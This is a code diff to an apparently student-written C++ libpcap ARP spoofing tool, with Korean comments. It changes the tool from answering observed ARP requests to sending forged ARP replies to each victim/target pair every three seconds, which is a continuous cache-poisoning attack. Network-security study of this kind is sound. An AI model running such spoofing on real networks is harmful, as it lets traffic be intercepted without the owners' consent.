@@ -1,5 +1,6 @@
 #include <cstdio>
 #include <pcap.h>
+#include <unistd.h>
 
 #include <iostream>     
 #include <cstring>       
@@ -180,34 +181,17 @@ int main(int argc, char* argv[]) {
     	arp_pairs.push_back({victim_ip, target_ip, victim_mac, target_mac, spoof_pkt});
 	}
 
-	//4. 패킷 잡으면서 검사 -> victim이 sip이면서 tip의 mac을 묻고 있다면? 패킷 전송
+	//4. 패킷 전송 -> arp는 신뢰기반이라서 그냥 전송해도 된다고 함..
 	while(true) {
-		struct pcap_pkthdr* header;
-		const u_char* packet;
-		int res = pcap_next_ex(pcap, &header, &packet);
-		if (res == 0) continue;
-		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
-			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
-			break;
-		}
-		EthArpPacket* eth_arp_packet = (EthArpPacket*)packet;
-
-		if (eth_arp_packet->eth_.type_ != htons(EthHdr::Arp)) continue;
-		if (eth_arp_packet->arp_.op_ != htons(ArpHdr::Request)) continue;
-
-		Ip sip = ntohl(eth_arp_packet->arp_.sip_);
-		Ip tip = ntohl(eth_arp_packet->arp_.tip_);
-
 		for (const auto& arp_pair : arp_pairs) {
-			if (sip == arp_pair.victim_ip && tip == arp_pair.target_ip){
-				// 5. ARP reply 패킷 전송
-				res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&arp_pair.spoof_packet), sizeof(EthArpPacket));
-				if (res != 0) {
-					fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(pcap));
-				}
-				printf("Sent Arp reply, %s -> %s\n", std::string(sip).c_str(), std::string(tip).c_str());
+			// 5. ARP reply 패킷 전송
+			int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&arp_pair.spoof_packet), sizeof(EthArpPacket));
+			if (res != 0) {
+				fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(pcap));
 			}
+			printf("Sent Arp reply, %s -> %s\n", std::string(arp_pair.victim_ip).c_str(), std::string(arp_pair.target_ip).c_str());
 		}
+		sleep(3);
 	}
 	pcap_close(pcap);
 }
